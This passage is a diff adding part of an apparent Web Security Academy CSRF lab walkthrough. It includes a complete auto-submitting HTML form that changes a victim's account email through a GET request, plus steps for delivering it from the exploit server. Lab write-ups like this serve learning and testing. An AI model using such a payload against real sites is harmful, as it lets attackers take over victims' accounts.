@@ -21,5 +21,34 @@ We need to pay attention that the POST Request has a CSRF tokens so that we can 
 
 Then, we go to the exploit server:
 
+We use the payload:
+
+```
+<html>
+    <body>
+        <form action="https://0a4400b4038a913d8034034b00410038.web-security-academy.net/my-account/change-email" method="GET">
+            <input type="hidden" name="email" value="nhatnam@evil-user.net" />
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
+
+```
+
+<img width="1897" height="672" alt="image" src="https://github.com/user-attachments/assets/d88808d1-4473-474f-9838-248b702e2609" />
 
 
+Then, click ```Store``` and ```View exploit``` button:
+
+<img width="1918" height="621" alt="image" src="https://github.com/user-attachments/assets/55adfc54-ca0f-4258-8dde-5160efa60f5b" />
+
+The wiener's email has been changed to ```nhatnam@evil-user.net```, the payload has been successful
+
+Go to exploit server, change another email and click ```Deliver exploit to victim```:
+
+<img width="1912" height="759" alt="image" src="https://github.com/user-attachments/assets/70e65b94-0fd2-4bd4-b992-4090f1fa241e" />
+
+
+### The lab has been solved
